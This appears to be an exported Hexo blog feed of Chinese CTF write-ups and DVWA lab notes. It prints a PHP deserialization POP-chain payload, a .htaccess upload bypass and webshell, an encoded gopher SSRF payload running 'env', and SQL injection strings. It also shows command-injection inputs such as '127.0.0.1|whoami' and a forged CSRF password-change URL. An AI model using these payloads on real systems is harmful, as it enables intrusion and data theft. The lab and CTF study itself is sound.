class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Samurai</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;fruit6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;xxx are the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">            <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Princess</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$fruit9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;The time spent with xxx is my happiest time&quot;</span> . <span class="variable language_">$this</span>-&gt;fruit9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span> . <span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessTwo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hiddenVar</span> = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hiddenVar = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hiddenVar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Warrior</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit12</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fruit13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fruit13 == <span class="string">&quot;xxx&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fruit12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessThree</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dummyVar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UselessFour</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lalala</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hehe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>我们主要是要利用mystery类中的原生类来读取flag文件，构造如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class CherryBlossom &#123;</span><br><span class="line">    public $fruit1;</span><br><span class="line">    public $fruit2;</span><br><span class="line">    public function __construct($a) &#123;</span><br><span class="line">        $this-&gt;fruit1 = $a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Samurai &#123;</span><br><span class="line">    public $fruit6;</span><br><span class="line">    public $fruit7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Warlord &#123;</span><br><span class="line">    public $fruit4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Philosopher &#123;</span><br><span class="line">    public $fruit10;</span><br><span class="line">    public $fruit11;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Mystery &#123;</span><br><span class="line">    public $SplFileObject;</span><br><span class="line">&#125;</span><br><span class="line">$mystery = new Mystery();</span><br><span class="line">$mystery-&gt;SplFileObject= &quot;/flag44545615441084&quot;;</span><br><span class="line">$philosopher = new Philosopher();</span><br><span class="line">$philosopher-&gt;fruit10 = $mystery;</span><br><span class="line">$philosopher-&gt;fruit11 = 213; </span><br><span class="line">$warlord = new Warlord();</span><br><span class="line">$warlord-&gt;fruit4 = $philosopher;</span><br><span class="line">$samurai = new Samurai();</span><br><span class="line">$samurai-&gt;fruit6 = $warlord;</span><br><span class="line">$samurai-&gt;fruit7 = $mystery;</span><br><span class="line">$cherry = new CherryBlossom($samurai);</span><br><span class="line">echo urlencode(serialize($cherry));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里有两个难点，其中就是如何触发mystery中的get方法，我们可以想到利用Philosopher中的$this-&gt;fruit10-&gt;hey;，那么我们就需要一个字符串能两次md5后有666，因为这个是“&#x3D;&#x3D;”弱比较所以只要有包含666的字符串就行了，扔给ai生成脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;666&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000000</span>):</span><br><span class="line">    input_str = <span class="built_in">str</span>(i)</span><br><span class="line">    temp = hashlib.md5(input_str.encode()).hexdigest()</span><br><span class="line">    final = hashlib.md5(temp.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> final.startswith(target):  <span class="comment"># 检查前缀是否为 &quot;666&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found: input=<span class="subst">&#123;input_str&#125;</span>, final_md5=<span class="subst">&#123;final&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>运行得到结果“213”，我们将$fruit11赋值为213便能触发mystery的get方法，接下来便是寻找原生类的运用，搜索发现我们可以分别利用GlobIterator 类读取目录和SplFileObject类读取文件，我们只要将mystery设置一个新属性属性名为我们要用的类，值是我们的路径，便可以先通过GlobIterator 类找到flag的名字在用SplFileObject读取flag文件就行了。</p>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>NSSCTF{e92e6ae9-2fd8-49cf-b5d2-8072e4f0862b} </p>
<h2 id="upupup"><a href="#upupup" class="headerlink" title="upupup"></a>upupup</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>根据提示不影响 .htaccess 语法的 mine绕过（getimagesize&amp;exif_imagetype绕过），我们可以在网上搜到文章<a href="https://blog.csdn.net/qq_45570082/article/details/108910162">php 文件上传.htaccess getimagesize和exif_imagetype绕过_getimagesize图片类型绕过-CSDN博客</a>，发现我们只要将.htaccess的内容设置为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">&lt;FilesMatch &quot;a.jpg&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>上传，再写一个图片马上传，再用蚁剑连接找到flag就行了。</p>
<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p>NSSCTF{09d16fca-9671-46e0-b912-3b5ef5621c53}</p>
<h2 id="Goph3rrr"><a href="#Goph3rrr" class="headerlink" title="Goph3rrr"></a>Goph3rrr</h2><p>由提示，我们先访问&#x2F;app.py下载源码.查看发现</p>
<p><img src="/../images/ad774e223c5624e0716c417260950908.png" alt="ad774e223c5624e0716c417260950908" loading="lazy"></p>
<p><img src="/../images/56ee79c15351f94c4e78283e4a8bb371.png" alt="56ee79c15351f94c4e78283e4a8bb371" loading="lazy"></p>
<p><img src="/../images/826d3e36771d059daf467bd565d31d51.png" alt="826d3e36771d059daf467bd565d31d51" loading="lazy"></p>
<p>根据hint可以想到利用gopher的ssrf漏洞再利用manage读取文件，要利用Manage那么我们就需要绕过127.0.0.0的检测如果直接通过浏览器访问&#x2F;manage,会被拦截并返回forbidden，那么这时候我们就需要通过gopher访问本地服务再通过本地服务发送请求这样才不会拦截，那么我们就可以开始构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://0:8000/_POST /Manage HTTP/1.1</span><br><span class="line">Host: 0:8000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">cmd=env</span><br></pre></td></tr></table></figure>

<p>构造过程参考<a href="https://blog.csdn.net/shw_yzh/article/details/141601445">CTFHub-SSRF过关攻略_hackhub攻略-CSDN博客</a>，我们只需保留请求包需要的最基本的请求头，我们还需要编码两次，在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码 。</p>
<p>由于127.0.0.1在黑名单中，所以我们需要改为0来绕过(参考<a href="https://blog.csdn.net/m0_73756016/article/details/138632803">ssrf学习2——内网ip绕过_ssrf 127.0.0.1绕过-CSDN博客</a>) 且端口是8000，根据提示，flag在环境变量里，那么我们就利用env打开环境变量便能获取flag</p>
<p>payload：<a href="http://node2.anna.nssctf.cn:28591/Gopher?url=gopher://0:8000/_POST%2520/Manage%2520HTTP/1.1%250D%250AHost%253A%25200%253A8000%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25207%250D%250A%250D%250Acmd%253Denv%250D%250A">http://node2.anna.nssctf.cn:28591/Gopher?url=gopher%3A%2F%2F0%3A8000%2F_POST%2520/Manage%2520HTTP/1.1%250D%250AHost%253A%25200%253A8000%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25207%250D%250A%250D%250Acmd%253Denv%250D%250A</a></p>
<h3 id="flag：-2"><a href="#flag：-2" class="headerlink" title="flag："></a>flag：</h3><p>NSSCTF{d334ec08-1ce4-4395-baa1-472f5e91273b}</p>
<h1 id="MISC-mybrave"><a href="#MISC-mybrave" class="headerlink" title="MISC mybrave"></a>MISC mybrave</h1><p>下载附件得到加密文件</p>
<p>发现里面只有一个文件，结合提示明文攻击，那么我们就可以利用png固定的文件头进行破解</p>
<p><code>89504E470D0A1A0A0000000D49484452</code>写成二进制文件，然后利用bkcrack进行密钥破解，得到密钥再把文件解密得到<img src="/../images/3.png" alt="3" loading="lazy"></p>
<p>用vscode二进制打开发现IEND之后还有数据，利用ai生成python代码将数据分离</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">split_known_iend</span>(<span class="params">file_path, iend_pos</span>):</span><br><span class="line">    <span class="comment"># 读取文件内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    end_pos = iend_pos + <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 分割数据</span></span><br><span class="line">    png_data = data[:end_pos]</span><br><span class="line">    extra_data = data[end_pos:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> png_data, extra_data</span><br><span class="line">png_part, extra_part = split_known_iend(<span class="string">&quot;C:\\tools\\bkcrack-1.7.1-win64\\3.png&quot;</span>, <span class="number">0x107b29</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;clean.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(png_part)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;extra_data.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(extra_part)</span><br></pre></td></tr></table></figure>



<p>，得到一个字符串<code>TlNTQ1RGe0knbV9XaDFzcDNyaU5nX091Ul9MdTExYWJZX2Ywcl9ZMHVfdG9fQ29NZV9CNGNrX0hvbWV9</code></p>
<p>base64解码得到</p>
<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p>NSSCTF{I’m_Wh1sp3riNg_OuR_Lu11abY_f0r_Y0u_to_CoMe_B4ck_Home}</p>
]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>Java学习</title>
    <url>/2025/08/17/Java%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>q</p>
<h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><h2 id="注释和关键字"><a href="#注释和关键字" class="headerlink" title="注释和关键字"></a>注释和关键字</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单行注释：//注释信息</span><br><span class="line">多行注释：/*注释信息*/</span><br><span class="line">文档注释：/**注释信息*/</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/08/04/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>NewStar_CTF2025</title>
    <url>/2025/10/02/NewStar-CTF2025/</url>
    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="strange-login"><a href="#strange-login" class="headerlink" title="strange_login"></a>strange_login</h2><p>sql注入万能密码秒了</p>
<p>paylaod:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; or 1=1#</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;45ddd317-837d-4a8a-843f-8e547077cf69&#125;</code></p>
]]></content>
  </entry>
  <entry>
    <title>DVWA</title>
    <url>/2025/02/24/DVWA/</url>
    <content><![CDATA[<h1 id="Brute-Force-暴力"><a href="#Brute-Force-暴力" class="headerlink" title="Brute Force(暴力)"></a>Brute Force(暴力)</h1><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>虽然题目叫暴力破解，但是这里还可以用sql注入。</p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>我们用万能密码admin‘ or 1&#x3D;1#尝试，发现并不能登录成功，而使用admin‘ and 1&#x3D;1#却可以登录成功。查看源码发现<code>if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</code></p>
<p>返回的结果只能是一条而使用or返回的是所有结果，一开始我还不懂为什么，查询资料才发现我对sql的查询逻辑有误解。</p>
<p>sql有这样的特性<strong>逐行扫描</strong>：数据库会检查每一行是否满足 <code>WHERE</code> 条件，无论是否已找到有效数据。<code>OR 1=1</code> 会导致所有行满足条件，因此全部返回。也就是说是根据结果是否符合or中的两个条件再返回而不是先检查or的条件再执行查询。</p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>关于bp中intruder四种爆破模式的区别可参考<a href="https://blog.csdn.net/qq_39101049/article/details/90234669">Burp Suite中intruder爆破模块四种模式的区别_bp两个payload-CSDN博客</a></p>
<p>使用可参照<a href="https://zhuanlan.zhihu.com/p/648596530">【实验报告】使用Burp Suite爆破网站登录账号，密码 - 知乎</a></p>
<p><img src="/../images/1740495704682.jpg" alt="1740495704682" loading="lazy"></p>
<p>成功。</p>
<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><p> 查看源码我们发现这关除了给user和password加上了过滤还在输入错误时sleep2秒以降低爆破的速度。</p>
<p>同样用bp爆破，只不过时间会慢一点。</p>
<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span>], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span>], <span class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>查看源码发现这关加了个token的验证。</p>
<p>我们来看一下token的原理和作用机制。</p>
<p>什么是Token？</p>
<p>当用户登录成功，服务器会生成一个唯一的token，这个token通常会包含以下信息：</p>
<ul>
<li>用户标识（例如用户ID）</li>
<li>token生成的时间戳</li>
<li>token的有效期</li>
<li>加密签名（用于验证token的完整性和真实性）</li>
</ul>
<p>服务器将生成的token发送给客户端，客户端保存token并在每次发送请求时携带这个token与服务器那储存的token进行验证，退出时token消失。这里的token在每次请求还会刷新。</p>
<p>首先添加payload</p>
<p><img src="/../images/1740562679448.jpg" alt="1740562679448" loading="lazy"></p>
<p>payload1(密码)使用字典，payload2（token）类型使用递归提取，在设置里提取响应包的内容</p>
<p><img src="/../images/1740562802371.jpg" alt="1740562802371" loading="lazy"></p>
<p><img src="/../images/1740562892199.jpg" alt="1740562892199" loading="lazy"></p>
<p>这里选择我们刚刚提取的token并且首次请求的token是我们刚刚再次发送请求包中的token不是我们抓包时的token。成功爆破接下来就是等待。</p>
<img src="../images/1740562965447.jpg" alt="1740562965447" loading="lazy">

<h1 id="Command-Injection-命令执行"><a href="#Command-Injection-命令执行" class="headerlink" title="Command Injection(命令执行)"></a>Command Injection(命令执行)</h1><p>第一次见这种漏洞，先了解一下基本情况。</p>
<p><strong>漏洞描述</strong><br>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一<br>如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击<br>PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大。</p>
<p><strong>命令执行与代码执行的区别</strong></p>
<p>代码执行：执行效果完全依赖于语言本身</p>
<p>命令执行：执行效果不受语言本身、命令本身的限制</p>
<h2 id="window常见的命令拼接符"><a href="#window常见的命令拼接符" class="headerlink" title="window常见的命令拼接符"></a>window常见的命令拼接符</h2><p><code>|</code>直接执行后面的语句</p>
<p><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</p>
<p><code>&amp;</code>前面和后面命令都要执行，无论前面真假</p>
<p><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
<h2 id="Linux常见的命令拼接符"><a href="#Linux常见的命令拼接符" class="headerlink" title="Linux常见的命令拼接符"></a>Linux常见的命令拼接符</h2><p>除了<code>|、||、&amp;、&amp;&amp;</code>还多了一个<code>;</code>，作用和<code>&amp;</code>一样.</p>
<h2 id="常见的命令执行函数："><a href="#常见的命令执行函数：" class="headerlink" title="常见的命令执行函数："></a>常见的命令执行函数：</h2><h4 id="1）system"><a href="#1）system" class="headerlink" title="1）system"></a><strong>1）system</strong></h4><p>该函数会把执行结果输出 并把输出结果的最后一行作为字符串返回 如果执行失败则返回false 这个也最为常用</p>
<h4 id="（2）exec"><a href="#（2）exec" class="headerlink" title="（2）exec"></a><strong>（2）exec</strong></h4><p>不输出结果,返回执行结果的最后一行 可以使用output进行输出</p>
<h4 id="（3）passthru"><a href="#（3）passthru" class="headerlink" title="（3）passthru"></a><strong>（3）passthru</strong></h4><p>此函数只调用命令 并把运行结果原样地直接输出 没有返回值。</p>
<h4 id="（4）shell-exec"><a href="#（4）shell-exec" class="headerlink" title="（4）shell_exec"></a><strong>（4）shell_exec</strong></h4><p>不输出结果，返回执行结果 使用反引号(&#96;&#96;)时调用的就是此函数</p>
<h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><p>查看源码发现并没有任何过滤代码，我们直接用<code>127.0.0.1&amp;whoami</code>,whoami会显示当前用户的用户名和SID（Windows操作系统中用于唯一标识用户、组和计算机账户的一个唯一标识符）。</p>
<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250226200124.png" alt="微信图片_20250226200124" loading="lazy"></p>
<p>成功。</p>
<h2 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(     <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,     <span class="string">&#x27;;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,   ); </span><br></pre></td></tr></table></figure>

<p>发现把<code>&amp;&amp;</code>和<code>；</code>过滤了，那么我们可以利用没有被过滤的命令拼接符，如<code>127.0.0.1&amp;whoami</code>.</p>
<h2 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$substitutions</span> = <span class="keyword">array</span>(     <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,     <span class="string">&#x27;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,     <span class="string">&#x27;;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,     <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,     <span class="string">&#x27;-&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,     <span class="string">&#x27;$&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,     <span class="string">&#x27;(&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,     <span class="string">&#x27;)&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,     <span class="string">&#x27;`&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,   ); </span><br></pre></td></tr></table></figure>

<p>发现把能过滤的都过滤了，不过仔细看发现<code>|</code>其实是<code>| </code>,多了个括号，那么这个过滤是没用的。我们直接用127.0.0.1|whoami测试成功。</p>
<h1 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h1><p><strong>第一次见，看原理：</strong></p>
<p>简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</p>
<p><img src="/../images/4ac86263c3d9cf6806d06c2129d42058.jpeg" alt="4ac86263c3d9cf6806d06c2129d42058" loading="lazy"></p>
<p>从上图能够看出，要完毕一次CSRF攻击，受害者必须依次完毕两个步骤：</p>
<p>​       <code> 登录受信任站点A，并在本地生成Cookie。</code></p>
<p>​       <code> 在不登出A的情况下，访问危险站点B。</code>(要在同一个浏览器中进行)</p>
<p>攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求;反之，攻击者将无法攻击成功。</p>
<h2 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h2><p>我们修改密码后发现发送的是GET请求，URL如下：</p>
<p><code>http://dvwa:8898/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</code></p>
<p>由此我们也可以伪造一个url</p>
<p><code>http://dvwa:8898/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</code></p>
<p>这样在登录状态下用同一个浏览器打开便会修改密码。</p>
<p>但是这样的url太明显了，我们可以利用站长工具生成一个短域名，用这个短域名进入的也是同一个页面。</p>
<p>我们也可以在html中用支持src的标签将url隐藏起来。</p>
